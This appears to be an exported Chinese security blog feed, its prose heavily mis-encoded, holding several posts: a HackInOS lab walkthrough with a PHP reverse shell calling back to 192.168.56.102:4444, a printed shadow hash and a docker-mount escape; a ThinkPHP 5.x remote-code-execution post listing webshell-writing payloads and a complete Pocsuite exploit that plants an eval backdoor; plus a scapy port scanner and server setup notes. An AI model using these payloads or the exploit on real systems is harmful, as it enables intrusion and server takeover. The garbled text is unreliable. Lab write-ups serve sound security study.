    <title><![CDATA[æ¸—é€å®æˆ˜:HackInOSé¶æœºå…¥ä¾µ]]></title>
    <url>%2F2019%2F03%2F21%2FHackInOS%2F</url>
    <content type="text"><![CDATA[0x01 å‰è¨€ éš¾åº¦å®šä½æ˜¯åˆçº§ CTFé£æ ¼ ä½œè€…: Fatih Ã‡elik 0x02 Nmapä¸€æŠŠæ¢­ è·å¾—ä¿¡æ¯ å¼€æ”¾ç«¯å£ 20 22 514 8000 apache 2.4.25 WordPress 5.0.3 robots.txt banäº†/upload.phpå’Œ/uploads 0x03 WPScanä¸€æŠŠæ¢­æœ‰wpçš„è¯ï¼Œå…ˆè®¿é—®8000çœ‹çœ‹ emmmâ€¦.åº”è¯¥æ˜¯localhostçš„é—®é¢˜ï¼Œå…ˆä¸ç®¡äº† æ—¢ç„¶æ˜¯wordpresså…ˆä¸Šwpscanæ‰«ä¸€æ³¢å§ wpscan --url http://192.168.56.101:8000 ä½†æ˜¯ Scan Aborted: Unable to identify the wp-content dir, please supply it with --wp-content-dir æœäº†ä¸‹ï¼Œç±»ä¼¼çš„é—®é¢˜å¾ˆå°‘ï¼Œå‡ ä¹æ²¡æœ‰â€¦ æœ€ååœ¨githubä¸Šæ‰¾åˆ°ä¸ªä¸Šå¤å¹´ä»£çš„åé¦ˆ è¯´å¯èƒ½æ˜¯é‡å®šå‘çš„é—®é¢˜ï¼Œä½†æˆ‘åœ¨å“åº”å¤´é‡Œæ²¡æ‰¾åˆ°ä»»ä½•é‡å®šå‘ï¼Ÿ è¿™éš¾é“æ˜¯é¶æœºä½œè€…æŒ–çš„å‘? é‚£å°±æŒ‡æ˜ä¸€ä¸‹wp-contentçš„ç›®å½•å§ wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content php 7.2.15 xmlrpc.php wp-cron.php æ‰«å‡ºæœ‰ä¸€æšXSSæ¼æ´ï¼Œä½†è¿™æœ‰å•¥ç”¨?æ‘”(â€²Ğ´ï½€ )â€¦å½¡â€¦å½¡ è®©æˆ‘æ‰“è°cookieå»?emmmmï¼Œé™·å…¥æ²‰æ€ æšä¸¾ä¸€ä¸‹ä¸»é¢˜æ¼æ´å’Œæ’ä»¶æ¼æ´ wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content --enumerate vt[i] No themes Found. wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content --enumerate vp[i] No plugins Found. å‡‰å‡‰ çµæœºä¸€åŠ¨çœ‹åˆ°æœ‰xmlrpc.php æ‹¿å‡ºmsfçˆ†ç ´ä¸€å‘ use auxiliary/scanner/http/wordpress_xmlrpc_loginset rhosts 192.168.56.101set rport 8000set threads 200set USER_FILE '/root/top10.txt'set PASS_FILE '/root/top10.txt'set STOP_ON_SUCCESS truerun 0x04 ç•¥è‰°éš¾çš„Getshellä¹‹è·¯å¥½çš„ï¼Œè¶çˆ†ç ´æ—¶é—´é€›ä¸€ä¸‹robots bançš„é¡µé¢ æˆ‘â€¦â€¦â€¦. æˆ‘éƒ½åœ¨æŠ˜è…¾ä¸ªå•¥ ä¸Šä¸ªå›¾ç‰‡è¯•è¯• è¿™ç®—æˆåŠŸäº†? è®¿é—®ä¸€ä¸‹ä¸å­˜åœ¨â€¦æ”¹åäº†è¿˜æ˜¯??? hintæ¥äº† å¥½çš„åˆè¢«å‘äº†ä¸€ä¸‹ï¼Œè¿™æ‰æ˜¯æ­£ç¡®url https://github.com/fatihhcelik/Vulnerable-Machine---Hint upload.phpæºç get &lt;?phpif(isset($_POST["submit"])) &#123; $rand_number = rand(1,100); $target_dir = "uploads/"; $target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number)); $file_name = $target_dir . basename($_FILES["file"]["name"]); $uploadOk = 1; $imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION)); $type = $_FILES["file"]["type"]; $check = getimagesize($_FILES["file"]["tmp_name"]); if($check["mime"] == "image/png" || $check["mime"] == "image/gif")&#123; $uploadOk = 1; &#125;else&#123; $uploadOk = 0; echo ":)"; &#125; if($uploadOk == 1)&#123; move_uploaded_file($_FILES["file"]["tmp_name"], $target_file.".".$imageFileType); echo "File uploaded /uploads/?"; &#125;&#125;?&gt; æ˜¯getimagesizeå…ˆåšä¸ªé©¬cat a.png a.php &gt; b.php ä¸Šä¼ æˆåŠŸäº† emmmå†™ä¸ªè„šæœ¬å§ import hashlibimport requestsfor i in range(1,100): t = 'b.php'+str(i) hash = hashlib.md5(t.encode()) url = 'http://192.168.56.101:8000/uploads/'+hash.hexdigest()+'.php' rs = requests.get(url) if rs.status_code != 404: print url åå¤å¤šæ¬¡æµ‹è¯•,æ²¡æœ‰??æ€ä¹ˆå¯èƒ½ï¼Œç¿»äº†å¥½å¤šèµ„æ–™ï¼Œç¿»äº†å¥½å¤šå›½å¤–çš„wpï¼Œæ€è·¯æ²¡é—®é¢˜ åªæ˜¯å¤šæ•°æ˜¯å†™æˆå­—å…¸è¿›è¡Œçˆ†ç ´çš„ ä½†æ˜¯å°±æ˜¯æ²¡è¿™ä¸ªæ–‡ä»¶ ç›´åˆ° æˆ‘å‘ç°è¿™ä¸ªä¸Šä¸€ç§’è¿˜åœ¨,ä¸‹ä¸€ç§’å°±æ¶ˆå¤±çš„æ–‡ä»¶ çœŸç›¸åªæœ‰ä¸€ä¸ªï¼Œè¿™ç«™æœ‰â€¦â€¦.æœ‰â€™ç‹—â€™ äº‹åæˆ‘æ‰¾äº†è®¸å¤špaperéƒ½æ˜¯å¯ä»¥ç›´æ¥ä¸Šä¼ çš„ï¼ŒåŒ…æ‹¬ä¸€å¥è¯ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘çš„é©¬å‘¢? å‰åè¯•è¿‡msfçš„phpåå¼¹å’Œæ™®é€šçš„phpåå¼¹ï¼Œä¸€å¥è¯ï¼ŒåŠ å¯†ä¸€å¥è¯ï¼Œä½†å¹¶æ²¡æœ‰ç”¨ msfçš„è¡¨ç°æœ€ç³Ÿç³•ï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œæ ¹æœ¬æ²¡æœ‰æƒé™ï¼Œè¿ç›®å½•æµè§ˆæƒé™éƒ½æ²¡æœ‰â€¦â€¦. æœ€åæ‰¾äº†ä¸ªphpå¼¹shellçš„æ–¹æ³• GIF89a&lt;?php$sock = fsockopen('192.168.56.102', 4444);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock);$process = proc_open('/bin/sh', $descriptorspec, $pipes);proc_close($process);?&gt; catä¹Ÿæ‡’å¾—catäº†ï¼Œç›´æ¥åŠ ä¸ªGIF89aä¹Ÿä¸€æ · nc -lvvp 4444 0x05 PWN!!!!!æ€»ç®—æ‹¿åˆ°shelläº†,å¯ä»¥è‚¯å®šæ˜¯æœ‰æŸç§æ£€æµ‹æœºåˆ¶çš„ï¼Œåªè¦æˆ‘å†™æ–‡ä»¶å°±ç›´æ¥æ–­è¿ï¼Œå¹¶ä¸”é©¬å„¿è¢«åˆ ï¼Œæˆ‘å¯æ€œçš„é©¬å„¿ # æŸ¥æ‰¾suidfind / -perm -4000 2&gt;/dev/null# æŸ¥çœ‹rootå¯†ç tail -c1G /etc/shadowroot:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7::: å¯†æ–‡æ‹¿åˆ°æ‰‹,ä¿å­˜ä¸ºrules.txtï¼Œé‚£johnè·‘ä¸€ä¸‹å¯†ç  john --wordlist=pass.lst --rules rules.txt è·‘å‡ºæ¥æ˜¯john,é†‰äº† å°è¯•sudoä½†command not foundï¼ŒsuæŠ¥é”™su: must be run from a terminal è¿˜å¥½æœ‰pyç¯å¢ƒ echo "import pty; pty.spawn('/bin/bash')" &gt; /tmp/asdf.pypython /tmp/asdf.py ( â€¢Ì€ Ï‰ â€¢Ì )y ä½†æ˜¯è¿›ç¨‹å°‘åˆ°ä¸å¯¹åŠ²ï¼Œæœ€èµ·ç çš„æ•°æ®åº“çš„è¿›ç¨‹ä¹Ÿæ²¡æœ‰ pingäº†ä¸‹dbæ˜¯172.18.0.3ï¼Œå—¯? mysql -h 172.18.0.3 -uwordpress -pwordpress è¿ä¸Šå»ç¿»äº†ä¸€ä¸‹ ssh_credï¼Œè§åçŸ¥ä¹‰ ä¸Šcmd5æŸ¥äº†ä¸€ä¸‹æ˜¯123456â€¦â€¦â€¦ sshä¸Šå» åŸæ¥æ˜¯dockerï¼Œæˆ‘è¯´æ€ä¹ˆè¿›ç¨‹è¿™ä¹ˆå¹²å‡€ä¸åƒubuntu 0x06 GetFlagæˆ‘ä»¥ä¸ºè¿™å°±å®Œäº† ç»“æœè¯´è¦æ‰¾åˆ°flagæ‰è¡Œâ€¦.. mysqlå’Œwordpresséƒ½æ˜ç¡®çš„ç›®çš„ é‚£ä¹ˆå°±æ˜¯ubuntuè¿™ä¸ªé•œåƒäº† docker run -v /:/ameer -i -t ubuntu /bin/bashåœ¨/ameer/rootæœ‰ä¸ªflag]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[åŸºäºPocsuiteçš„ThinkPHP 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨]]></title>
    <url>%2F2019%2F01%2F11%2Fthinkphp-5-x-pocsuite%2F</url>
    <content type="text"><![CDATA[åŠé†‰åŠé†’æ—¥å¤æ—¥,èŠ±è½èŠ±å¼€å¹´å¤å¹´ã€‚ 2019äº†ã€‚ æ¼æ´åˆ†æ æ¼æ´åˆ†ææœ‰å¾ˆå¤šå¤§ä½¬å·¨ä½¬åšè¿‡äº†ï¼Œæˆ‘å°±ä¸çŒ®ä¸‘äº†emmmmç»™å¤§å®¶æ‰¾äº†ä¸€ç¯‡åˆ†æpaperï¼Œå»ºè®®å»ç ”ç©¶ç ”ç©¶ æ°´æ³¡æ³¡ æ¼æ´è¯¦æƒ… æ¼æ´å½±å“:Thinkphp 5.0.23åŠ5.1.31ä»¥ä¸‹(å³12æœˆ9æ—¥å®‰å…¨æ›´æ–°å‰æ‰€æœ‰ç‰ˆæœ¬) vulnspyçš„æ¼æ´æºç  å®˜æ–¹æ¼æ´æºç  å®˜æ–¹githubæºç  Thinkphp v5.0.xè¡¥ä¸ Thinkphp v5.1.xè¡¥ä¸ seebug æ³¨æ„:å®˜ç½‘åªæœ‰5.0.xçš„ç‰ˆæœ¬ï¼Œæµ‹è¯•5.1.xéœ€è¦åˆ°githubè‡ªå·±cloneä¸€ä¸ªå†ç”¨composerå®‰è£…æˆ–è€…ç”¨vulnspyçš„ composer å…¨å¹³å°å…±æœ‰å…·æœ‰æ¼æ´çš„ç±»å¯ä»¥ç»§ç»­æŒ–æ˜æ›´å¤špayloadï¼Œæˆ‘å°±ä¸(tai)æ¥(cai)äº†(le) think\Routethink\Loaderthink\Errorthink\Appthink\Envthink\Configthink\Hookthink\Langthink\Requestthink\Log ç¼–å†™å‰å‡†å¤‡å¯¹äºç½‘ä¸Šçš„payloadè¿›è¡Œäº†æ”¶é›†,æœ¬æ‰“ç®—åŸºäºä»¥ä¸‹å››ä¸ªpayloadè¿›è¡ŒPocçš„ç¼–å†™ Request/inputindex.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1index.php?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php Request/cacheindex.php?s=index/\think\request/cache&amp;key=1|phpinfoindex.php?s=index/\think\request/cache&amp;key=dir|systemindex.php?s=index/\think\request/cache&amp;key=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php|system container/invokefunctionindex.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiindex.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E app/invokefunctionindex.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiindex.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20phpinfo();?&gt;%22%20&gt;%20info.phpindex.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E è¿˜æœ‰ä¸€ä¸ªè²Œä¼¼åªèƒ½å†™æ–‡ä»¶çš„ index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval($_POST[123]);?%3C Payloadæµ‹è¯•æµ‹è¯•çš„æ—¶å€™å‘ç°äº†äº›é—®é¢˜ å‰ä¸‰ä¸ªpaylaodå¯¹äº5.0.xæ— æ•ˆï¼Œåªæœ‰ç¬¬å››ä¸ªæœ‰æ•ˆ è€Œ5.1.xåˆ™é€šæ€ ç»“åˆæ°´æ³¡æ³¡çš„åˆ†æ é‚£å°±åªæœ‰app/invokefunctionä¸€æ¡è·¯å¯ä»¥èµ°äº† Pocçš„ç¼–å†™#!/usr/bin/env python# coding: utf-8from pocsuite.net import reqfrom pocsuite.poc import POCBase, Outputfrom pocsuite.utils import registerclass ThinkphpPoC(POCBase): vulID = '97767' version = '1' author = ['p1n3'] vulDate = '2019-01-11' createDate = '2019-01-11' updateDate = '2019-01-11' references = ['https://www.seebug.org/vuldb/ssvid-97767'] name = 'Thinkphp 5.0.23åŠ5.1.31ä»¥ä¸‹ è¿œç¨‹ä»£ç æ‰§è¡Œ' appPowerLink = 'http://www.thinkphp.cn/' appName = 'Thinkphp' appVersion = '5.x' vulType = 'RCE' desc = ''' ç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ å¯èƒ½çš„è¿œç¨‹ä»£ç æ‰§è¡Œå¯¼è‡´getshellï¼Œå—å½±å“åŒ…æ‹¬Thinkphpå…¨ç‰ˆæœ¬ï¼Œå»ºè®®æ›´æ–°åˆ°æœ€æ–°ç‰ˆæˆ–å¼€å¯å¼ºåˆ¶è·¯ç”± ''' samples = [''] def _verify(self): result = &#123;&#125; payload = self.url + '/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=print_r&amp;vars[1][]=fae0b27c451c728867a567e8c1bb4e53' response = req.get(payload) # md5(666) çš„å€¼ if 'fae0b27c451c728867a567e8c1bb4e53' in str(response.content): result = &#123;'VerifyInfo': &#123;&#125;&#125; result['VerifyInfo']['payload'] = payload return self.parse_result(result) def _attack(self): result = &#123;&#125; info = &#123; 'ResultCode': &#123; 'a': False, 'b': False &#125; &#125; payload1 = self.url + '/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20eval($_POST[666]);?%3E' payload2 = self.url + '/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20eval($_POST[666]);?&gt;%22%20&gt;%20info.php' req.get(payload1) if req.get(self.url + '/info.php').status_code == 200: result = &#123;'AttackInfo': &#123;&#125;&#125; info['ResultCode']['a'] = True result['AttackInfo']['payload'] = payload1 else: req.get(payload2) if req.get(self.url + '/info.php').status_code == 200: result = &#123;'AttackInfo': &#123;&#125;&#125; info['ResultCode']['b'] = True result['AttackInfo']['payload'] = payload2 if info['ResultCode']['a'] or info['ResultCode']['b']: result['AttackInfo']['shell'] = self.url+'/info.php' result['AttackInfo']['pass'] = '666' return self.parse_result(result) def parse_result(self, result): output = Output(self) if result: output.success(result) else: output.fail('The vulnerability does not appear to be available!') return outputregister(ThinkphpPoC) Pocæµ‹è¯• è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç”¨Pocsuiteï¼Œå†™çš„ä¸å¥½â€¦ä½ æ¥æ‰“æˆ‘å‘€ ç›¸æ¯”pentestDBç­‰ï¼ŒPocsuiteä½“éªŒéå¸¸ä¸é”™ï¼Œæ‰“ç®—ä»¥åå°±ä¸€ç›´ä½¿ç”¨Pocsuiteå¥½äº†(å¦‚æœæœ‰æ›´å¥½çš„æ¡†æ¶è¯·åŠ¡å¿…ç§ä¿¡æˆ‘) verifyæ¨¡å¼å¿˜æˆªå›¾äº† attackæ¨¡å¼ä¼šç›´æ¥åœ¨åŒç›®å½•ä¸‹å†™ä¸€å¥è¯æœ¨é©¬ ç¥­å‡ºæ³•å™¨ä¸­å›½èšå‰‘ æ–‡ä»¶æ˜¯info.php å¯†ç 666 å¾ˆå¥½ enjoy it]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonæ‰“é€ åŸºäºscapyçš„æ‰«æå™¨]]></title>
    <url>%2F2018%2F11%2F17%2Fweb-scan%2F</url>
    <content type="text"><![CDATA[å‡†å¤‡äº‹å®œscapyåº“git clone https://github.com/secdev/scapy.gitcd ./scapypython setup.py æ„æ€ æ”¾ä¸ªä¸‰æ¬¡æ¡æ‰‹åŸç†å›¾ä¸è¢«æ‰«ææœºè¿›è¡ŒSYNæ¡æ‰‹ï¼Œæœ‰å›åº”å°±æ˜¯å¼€æ”¾äº†ç«¯å£åŸºæœ¬æ€è·¯å‚è€ƒ scapyå®˜æ–¹æ–‡æ¡£ å¦‚ä½•ç”¨Scapyå†™ä¸€ä¸ªç«¯å£æ‰«æå™¨ï¼Ÿ Pythonçš„æ— çŠ¶æ€SYNå¿«é€Ÿæ‰«æ å®Œæ•´çš„é¡¹ç›®æˆ‘æ”¾åˆ°äº†githubä¸Š è¿™é‡Œ é¢„å®šä¹‰çš„å…¨å±€å˜é‡#ç›®æ ‡ipä¸ç«¯å£ports = ''target = ''#å®šä¹‰æ˜¯å¦ç”¨socketæ‰«æï¼Œé»˜è®¤ç”¨synsocket_scan_mode = False#åˆè®¡socketæ‰«åˆ°ç«¯å£socket_flag = 0# Pn = True# socketæ‰«æå¤šçº¿ç¨‹é”lock = threading.Semaphore(value=1)#é»˜è®¤æ‰«æçš„ç«¯å£default_ports = [...]#ç«¯å£å¯èƒ½å¯¹åº”çš„æœåŠ¡port_list = &#123;...&#125; getoptæ¨¡å—å¤„ç†ç”¨æˆ·è¾“å…¥def usage(): #ç”¨æ³•æç¤º print "Usage: pineScan.py -t target_host (-p)" print " -h --help" print " -t --target" print " example: -t 127.0.0.1" print " -p --port" print " example: -p 80,445" print " -s --socket" #print " -Pn --skip host discovery" def init(): global ports global target global socket_scan_mode try: #å¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°è§£æ opts, args = getopt.getopt(sys.argv[1:],"hp:t:s",["help","port","target","socket"]) for o,a in opts: if o in ("-h","--help"): usage() exit(0) elif o in ("-t","--target"): target = a elif o in ("-p","--port"): ports = a elif o in ("-s","--socket"): socket_scan_mode = True elif o in ("-Pn"): Pn = True else: print "Unhandled Option" exit(0) if target: #è°ƒç”¨æ‰«æ portScan(target, ports) else: usage() exit(0) except Exception as e: print str(e) print usage() socketæ‰«ææ ¸å¿ƒä»£ç socketæ‰«æå†™éƒ½å†™äº†ï¼Œæ‡’å¾—åˆ äº†â€¦emmmmdef socket_scan(target, port): #socketå…¨è¿æ¥ global socket_flag try: conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #è®¾ç½®è¶…æ—¶ conn.settimeout(2) conn.connect((target, port)) lock.acquire() print '[*] %d/tcp open %s\r' % (port,port_list[port]) #è®¡ç®—å¼€å¯çš„ç«¯å£ socket_flag = socket_flag + 1 except: #çº¿ç¨‹é‡Šæ”¾ lock.release() conn.close() synæ‰«ææ ¸å¿ƒä»£ç def syn_scan(ip,ports): #æ„é€ æ•°æ®åŒ… ans,unans=sr(IP(dst=ip)/TCP(dport=ports, flags='S'),timeout = 5) print "PORT STATE SERVICE" for snd,rcv in ans: #ä»è¿”å›åŒ…è¯»å–æ•°æ® port = rcv.sprintf("%IP.sport%") service = rcv.sprintf("%TCP.sport%") flag = rcv.sprintf("%TCP.flags%") if flag == 'SA': #SAæ˜¯å¼€æ”¾äº†ç«¯å£ if is_number(service): #åŒ…ä¸­ä¿¡æ¯çš„è¯»å–è‹¥ä¸ºæ•°å­—ï¼Œè°ƒç”¨å­—å…¸æŸ¥è¯¢å¯èƒ½çš„å¯¹åº”æœåŠ¡å¹¶æ›¿æ¢ if service in port_list.keys(): service = port_list[service] else: service = 'unknown' #æ ¼å¼åŒ–è¾“å‡º print '%-10.5sopen %s' % (port,service) æ‰«æè°ƒç”¨æ¨¡å—#ä»¥é€—å·åˆ†å‰²ç«¯å£å·ports = ports.split(",")#å¯¹stringç±»å‹åˆ—è¡¨å¤„ç†æˆintç±»å‹ports = [int(i) for i in ports]#åˆ¤æ–­æ˜¯socketæ‰«æè¿˜æ˜¯synæ‰«æif socket_scan_mode: for port in ports: #å¤šçº¿ç¨‹è°ƒç”¨socket thread = threading.Thread(target=socket_scan, args=(target, int(port))) thread.start() if socket_flag == 0: print "socket scan done!but no port is open"else: #synä¸­æ•´ä¸ªåˆ—è¡¨ä¼ è¾“æ‰§è¡Œæ¯”forå¾ªç¯æ›´å¿« syn_scan(target,ports) å®é™…ç»“æœå±•ç¤ºè¿˜ç®—å¯ä»¥ï¼ŒæŠ€æœ¯æ‰€é™ï¼Œå¤§ä½¬è½»å–·]]></content>
      <categories>
        <category>ç¼–ç¨‹ä¹‹é“</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å°ç«™è¿ç§»è®°(Nginxè‡ªåŠ¨åŒ–éƒ¨ç½²)]]></title>
    <url>%2F2018%2F11%2F09%2Fweb-migration%2F</url>
    <content type="text"><![CDATA[SSHéƒ¨ç½²é˜¿é‡Œäº‘vpsç›´æ¥åœ¨é˜¿é‡Œäº‘æ§åˆ¶å°å¯¼å…¥ssh-keygenç”Ÿæˆçš„ç§˜é’¥ç§˜é’¥ç”Ÿæˆçœ‹è¿™é‡Œssh git@serverip -i ~/.ssh/id_rsa å®‰è£…nginx apt-get updateapt-get install nginx/etc/init.d/nginx start è®¿é—®ip,çœ‹åˆ°Welcome to nginx! é…ç½®æˆåŠŸäº† å®‰è£…Gitsudo apt-get install git#åˆ›å»ºä¸€ä¸ªgitç”¨æˆ·,ç”¨äºè¿è¡ŒgitæœåŠ¡sudo adduser git#å¯¼å…¥ç§˜é’¥åˆ°/home/git/.ssh/authorized_keys#ä¿®æ”¹æƒé™chmod 600 authorized_keys#åˆå§‹åŒ–gitä»“åº“git init --bare blo.git#æ›´æ”¹æ‰€æœ‰æƒsudo chown -R git:git blog.git#ç¦æ­¢shellç™»å½•ä¿®æ”¹/etc/passwdçš„git:x:1003:1003::/home/git:/bin/bashæ”¹ä¸ºgit:x:1003:1003::/home/git:/usr/bin/git-shell#å…‹éš†è¿œç¨‹ä»“åº“git clone git@serverip:/home/git/blog.git é…ç½®nginxæ‡’çš„é…äº†,ç›´æ¥æŠŠhtmlåˆ äº†git clone /home/git/blog.git html ä»ä»“åº“å…‹éš†è¿‡æ¥ç›´æ¥æ›¿æ¢æ‰ é…ç½®Gité’©å­hooksblog.gitæ–‡ä»¶å®¶é‡Œæœ‰ä¸€ä¸ªhooksæ–‡ä»¶å¤¹é‡Œè¾¹æœ‰å„ç§hookä¾‹å­$ vim blog.git/hooks/post-receive å†™å¦‚ä¸‹ä»£ç #!/bin/shunset GIT_DIR #è¿˜åŸç¯å¢ƒå˜é‡ï¼Œå¦åˆ™ä¼šæ‹‰ä¸åˆ°ä»£ç cd /var/www/htmlgit pull origin master æ³¨æ„è¦chmod 755 blog.git/hooks/post-receive æµ‹è¯•æœ¬åœ°ä¿®æ”¹hexoé…ç½®æ–‡ä»¶deploy: type: git # éƒ¨ç½²åˆ°æˆ‘çš„gitä»“åº“ repo: git@serverip:/home/git/blog.git # åˆ†æ”¯é»˜è®¤master branch: master sshå‚è€ƒ nginxå®‰è£…å‚è€ƒ nginxé…ç½®å‚è€ƒ GitæœåŠ¡å™¨æ­å»ºå‚è€ƒ è¯¦ç»†å‚è€ƒ]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>vps</tag>
        <tag>nginx</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dockerä»å…¥é—¨åˆ°æ”¾å¼ƒ]]></title>
    <url>%2F2018%2F10%2F28%2Fdocker-1%2F</url>
    <content type="text"><![CDATA[docker dockerä¸‰å¤§æ ¸å¿ƒ: é•œåƒ -é•œåƒä¸å¯å†™ å®¹å™¨ -å®¹å™¨åŸºäºé•œåƒç”Ÿæˆ(å¯å†™) ä»“åº“ -ä»“åº“å­˜å‚¨é•œåƒ(ç±»ä¼¼äºGitçš„ç®¡ç†æœºåˆ¶) dockerçš„å®‰è£…wget -qO- https://get.docker.com/ | sh å®‰è£…å®Œå,å°†dockerè´¦æˆ·æ·»åŠ åˆ°sherdhç”¨æˆ·ç»„(éroot)ä»¥ä¾¿æ‰§è¡Œ,ç„¶åç™»å‡ºå†ç™»å½•å¦åˆ™ä¼šæŠ¥no permissionsudo groupadd dockersudo gpasswd -a $&#123;USER&#125; dockersudo service docker restartnewgrp - docker #å¯åŠ¨dockersudo service docker start #æµ‹è¯•dockerdocker run hello-world èœé¸Ÿæ•™ç¨‹ å¸¸ç”¨å‘½ä»¤# æœç´¢é•œåƒdicker search centos# ä¸‹è½½é•œåƒdocker pull name# -t ç»‘å®šä¼ªç»ˆç«¯ -i ä¿æŒæ ‡å‡†è¾“å…¥ -d åå°è¿è¡Œ -p ç«¯å£æ˜ å°„docker run -t -i -p 1000:80 docker.io/centos /bin/bash# å±•ç¤ºæ‰€æœ‰é•œåƒdocker images# ä¿å­˜é•œåƒdocker save -o centos7.tar docker.io/centos# è½½å…¥é•œåƒdocker load --input centos7.tar# ä¿å­˜å®¹å™¨docker export id &gt; name.tar# è½½å…¥å®¹å™¨æˆä¸ºé•œåƒcat name.tar | docker import - sherdh/ubuntu:v1.0# æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨(æ‰€æœ‰)docker ps ï¼ˆ-aï¼‰# å¯åŠ¨/ç»ˆæ­¢å®¹å™¨docker start/stop id (-i)# åˆ é™¤é•œåƒdocker rmi id# åˆ é™¤å®¹å™¨docker rm id é‚£äº›æŠ˜è…¾ç¬¬ä¸€å‘ä¸è¦å¼ºåˆ¶åˆ é™¤ä¸€ä¸ªå­˜åœ¨å®¹å™¨ä¾èµ–çš„é•œåƒå³ -f ,å› ä¸ºä¼šäº§ç”Ÿå„ç§è«åå…¶å¦™çš„é—®é¢˜å…ˆåˆ é™¤å®¹å™¨,å¦‚æœå®¹å™¨åœ¨è¿è¡Œï¼Œéœ€è¦å…ˆåœæ­¢#æŸ¥çœ‹æ‰€æœ‰å®¹å™¨docker ps -adocker rm å®¹å™¨id åˆ›å»ºé•œåƒåŸºäºå·²æœ‰å®¹å™¨docker commit -a "sherdh" -m "add a new file" å®¹å™¨id test(æ–°é•œåƒåå­—) æ³¨æ„æ˜¯å®¹å™¨idï¼Œä¸æ˜¯é•œåƒid åŠ tagdocker tag test:latest sherdh/test:latest åŠ äº†tagåï¼Œæœ‰ä¸¤ä¸ªåŒidçš„imagesè¿™æ—¶åˆ é™¤é•œåƒæŠ¥é”™Error response from daemon: conflict: unable to delete c30eab908457 (must be forced) - image is referenced in multiple repositories åˆ é™¤æ—¶éœ€è¦æŒ‡å®šåå­—ï¼Œè€Œä¸æ˜¯id è¿è¡ŒæŠ¥é”™standard_init_linux.go:178: exec user process caused â€œexec format errorâ€æŸ¥åˆ°åŸå› æ˜¯dockerä¸æ”¯æŒ32ä½ubuntuâ€¦ä¹–ä¹–é‡è£…ç³»ç»Ÿå» ä½¿ç”¨dockerfileåˆ›å»ºé•œåƒFROM ubuntuMAINTAINER PinE sherdh@gmail.comRUN echo "deb http://archive.ubuntu.com/ubuntu/ raring main universe" &gt;&gt; /etc/apt/sources.listRUN apt-get update &amp;&amp; apt-get install -y nginx inotify-tools apache2 openssh-serverRUN echo "\ndaemon off;" &gt;&gt; /etc/nginx/nginx.conf# è‡ªå¯åŠ¨RUN bash -c 'echo "firefox" &gt;&gt; /.bashrc'# æ‰“å¼€ç«¯å£EXPOSE 5900# å®¹å™¨å¯åŠ¨æ‰§è¡Œçš„å‘½ä»¤CMD /usr/sbin/nginx]]></content>
      <categories>
        <category>æ‚ä¸ƒæ‚å…«</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF-write-up(WEBé¢˜)]]></title>
    <url>%2F2018%2F09%2F28%2FBugkuCTF-write-up%2F</url>
